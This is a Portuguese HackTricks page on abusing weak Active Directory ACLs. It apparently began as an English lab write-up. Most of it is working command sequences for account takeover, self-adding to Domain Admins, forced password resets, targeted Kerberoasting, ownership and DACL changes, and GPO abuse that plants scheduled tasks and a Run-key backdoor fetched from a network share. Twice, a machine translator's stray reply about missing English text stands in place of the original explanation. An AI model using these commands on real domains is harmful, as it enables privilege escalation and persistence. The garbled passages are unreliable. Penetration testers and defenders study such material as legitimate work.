# Abusando das ACLs/ACEs do Active Directory

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rápido. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Contexto

Este laboratório é para abusar de permissões fracas das Listas de Controle de Acesso Discricionário (DACLs) do Active Directory e das Entradas de Controle de Acesso (ACEs) que compõem as DACLs.

Objetos do Active Directory, como usuários e grupos, são objetos seguráveis e as DACLs/ACEs definem quem pode ler/modificar esses objetos (por exemplo, alterar o nome da conta, redefinir a senha, etc).

Um exemplo de ACEs para o objeto segurável "Domain Admins" pode ser visto aqui:

![](../../../.gitbook/assets/1.png)

Algumas das permissões e tipos de objetos do Active Directory que nos interessam como atacantes:

* **GenericAll** - direitos completos sobre o objeto (adicionar usuários a um grupo ou redefinir a senha do usuário)
* **GenericWrite** - atualizar atributos do objeto (por exemplo, script de logon)
* **WriteOwner** - mudar o proprietário do objeto para um usuário controlado pelo atacante e assumir o controle do objeto
* **WriteDACL** - modificar as ACEs do objeto e dar ao atacante o controle total sobre o objeto
* **AllExtendedRights** - habilidade de adicionar um usuário a um grupo ou redefinir a senha
* **ForceChangePassword** - habilidade de mudar a senha do usuário
* **Self (Autoassociação)** - habilidade de se adicionar a um grupo

Neste laboratório, vamos explorar e tentar explorar a maioria das ACEs acima.

Vale a pena se familiarizar com todas as [arestas do BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) e com o maior número possível de [Direitos Estendidos](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) do Active Directory, pois você nunca sabe quando pode encontrar um menos comum durante uma avaliação.

## GenericAll em Usuário

Usando powerview, vamos verificar se nosso usuário atacante `spotless` tem `GenericAll rights` no objeto AD para o usuário `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Podemos ver que de fato nosso usuário `spotless` tem os direitos `GenericAll`, permitindo efetivamente que o atacante assuma a conta:

![](../../../.gitbook/assets/2.png)

*   **Alterar senha**: Você poderia simplesmente alterar a senha desse usuário com

```bash
net user <username> <password> /domain
```
*   **Kerberoasting Direcionado**: Você poderia tornar o usuário **kerberoastable** definindo um **SPN** na conta, fazer kerberoasting e tentar quebrar offline:

```powershell
# Definir SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# Obter Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap
# Limpar SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# Você também pode usar a ferramenta https://github.com/ShutdownRepo/targetedKerberoast
# para obter hashes de um ou todos os usuários
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ASREPRoasting Direcionado**: Você poderia tornar o usuário **ASREPRoastable** **desativando** a **pré-autenticação** e então fazer ASREPRoast.

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## GenericAll em Grupo

Vamos ver se o grupo `Domain admins` tem alguma permissão fraca. Primeiro, vamos obter seu `distinguishedName`:
```csharp
Get-NetGroup "domain admins" -FullData
```
Como não foi fornecido texto em inglês para tradução, não posso realizar a tradução solicitada. Se você fornecer o texto em inglês relevante, ficarei feliz em ajudar com a tradução para o português.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que o nosso usuário atacante `spotless` tem novamente direitos de `GenericAll`:

![](../../../.gitbook/assets/5.png)

Efetivamente, isso nos permite adicionar a nós mesmos (o usuário `spotless`) ao grupo `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

O mesmo pode ser alcançado com o Active Directory ou o módulo PowerSploit:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write em Computador/Usuário

* Se você tem esses privilégios em um **objeto Computador**, você pode realizar [Kerberos **Delegação Restrita Baseada em Recurso**: Domínio do Objeto Computador](../resource-based-constrained-delegation.md).
* Se você tem esses privilégios sobre um usuário, você pode usar um dos [primeiros métodos explicados nesta página](./#genericall-on-user).
* Ou, seja em um Computador ou em um usuário, você pode usar **Shadow Credentials** para se passar por ele:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty em Grupo

Se nosso usuário controlado tem o direito `WriteProperty` em `All` objetos para o grupo `Domain Admin`:

![](../../../.gitbook/assets/7.png)

Podemos novamente nos adicionar ao grupo `Domain Admins` e escalar privilégios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## Self (Autoassociação) em Grupo

Outro privilégio que permite ao atacante adicionar-se a um grupo:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Autoassociação)

Mais um privilégio que permite ao atacante adicionar-se a um grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
Como o conteúdo solicitado para tradução não foi fornecido, não posso realizar a tradução. Se você fornecer o texto específico que deseja traduzir, ficarei feliz em ajudar.
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

Se tivermos `ExtendedRight` no tipo de objeto `User-Force-Change-Password`, podemos redefinir a senha do usuário sem saber sua senha atual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

Fazendo o mesmo com powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

Outro método que não requer manipulação da conversão de senha para string segura:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
```markdown
![](../../../.gitbook/assets/15.png)

...ou um comando único se uma sessão interativa não estiver disponível:
```
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

e uma última maneira de conseguir isso do Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Mais informações:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/pt-br/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/pt-br/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/pt-br/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/pt-br/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner em Grupo

Observe como, antes do ataque, o proprietário de `Domain Admins` é `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Após a enumeração de ACE, se descobrirmos que um usuário sob nosso controle possui direitos de `WriteOwner` em `ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/18.png)

...podemos alterar o proprietário do objeto `Domain Admins` para o nosso usuário, que no nosso caso é `spotless`. Observe que o SID especificado com `-Identity` é o SID do grupo `Domain Admins`:
```
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## GenericWrite em Usuário
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

`WriteProperty` em um `ObjectType`, que neste caso específico é `Script-Path`, permite que o atacante sobrescreva o caminho do script de logon do usuário `delegate`, o que significa que na próxima vez que o usuário `delegate` fizer logon, seu sistema executará nosso script malicioso:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
Abaixo mostra o campo de script de logon do usuário ~~`delegate`~~ atualizado no AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite em Grupo

Isso permite que você defina como membros do grupo novos usuários (você mesmo, por exemplo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rápido. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em todo o seu conjunto tecnológico, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

Se você é o proprietário de um grupo, como eu sou o proprietário de um grupo AD `Test`:

![](../../../.gitbook/assets/22.png)

O que você pode, claro, fazer através do powershell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

E você tem um `WriteDACL` naquele objeto AD:

![](../../../.gitbook/assets/24.png)

...você pode conceder a si mesmo privilégios [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) com um toque de magia ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
O que significa que você agora controla totalmente o objeto AD:

![](../../../.gitbook/assets/25.png)

Isso efetivamente significa que você agora pode adicionar novos usuários ao grupo.

É interessante notar que eu não consegui abusar desses privilégios usando o módulo Active Directory e os cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Replicação no domínio (DCSync)**

A permissão **DCSync** implica ter estas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.\
[**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

Às vezes, certos usuários/grupos podem ter acesso delegado para gerenciar Objetos de Política de Grupo, como é o caso do usuário `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos verificar isso utilizando o PowerView desta forma:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
### Enumerar Permissões de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que o ObjectDN acima, da captura de tela anterior, está se referindo ao GPO `New Group Policy Object`, pois o ObjectDN aponta para `CN=Policies` e também para `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que é o mesmo nas configurações do GPO, conforme destacado abaixo:

![](../../../.gitbook/assets/a15.png)

Se quisermos procurar especificamente por GPOs mal configurados, podemos encadear múltiplos cmdlets do PowerSploit assim:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Computadores com uma Determinada Política Aplicada**

Agora podemos resolver os nomes dos computadores aos quais a GPO `Misconfigured Policy` é aplicada:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**Políticas Aplicadas a um Computador Específico**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
```markdown
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**OUs com uma Determinada Política Aplicada**
```
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Uma das formas de abusar dessa má configuração e obter execução de código é criar uma tarefa agendada imediata através do GPO assim:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

O comando acima adicionará nosso usuário spotless ao grupo `administrators` local do computador comprometido. Observe como, antes da execução do código, o grupo não contém o usuário `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso de GPO**

{% hint style="info" %}
Você pode verificar se o módulo GroupPolicy está instalado com `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. Em um aperto, você pode instalá-lo com `Install-WindowsFeature –Name GPMC` como um administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, após a atualização do GPO, também precisará que alguém faça login no computador.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
Ele não pode criar GPOs, então ainda devemos fazer isso com o RSAT ou modificar um ao qual já temos acesso de escrita.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política <a href="#force-policy-update" id="force-policy-update"></a>

As atualizações abusivas anteriores do **GPO são recarregadas** aproximadamente a cada 90 minutos.\
se você tiver acesso ao computador, pode forçá-lo com `gpupdate /force`.

### Por baixo dos panos <a href="#under-the-hood" id="under-the-hood"></a>

Se observarmos as Tarefas Agendadas do GPO `Política Mal Configurada`, podemos ver nossa `evilTask` lá:

![](../../../.gitbook/assets/a22.png)

Abaixo está o arquivo XML que foi criado pelo `New-GPOImmediateTask` que representa nossa tarefa agendada maliciosa no GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Usuários e Grupos <a href="#users-and-groups" id="users-and-groups"></a>

A mesma escalada de privilégios poderia ser alcançada abusando do recurso GPO Usuários e Grupos. Observe no arquivo abaixo, linha 6, onde o usuário `spotless` é adicionado ao grupo local `administrators` - poderíamos mudar o usuário para outro, adicionar mais um ou até adicionar o usuário a outro grupo/múltiplos grupos, já que podemos alterar o arquivo de configuração da política no local mostrado devido à delegação do GPO atribuída ao nosso usuário `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

Além disso, podemos considerar o uso de scripts de logon/logoff, utilizar o registro para autoruns, instalar .msi, editar serviços e outros métodos de execução de código.

## Referências

* Inicialmente, estas informações foram principalmente copiadas de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rapidamente. Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprenda hacking em AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
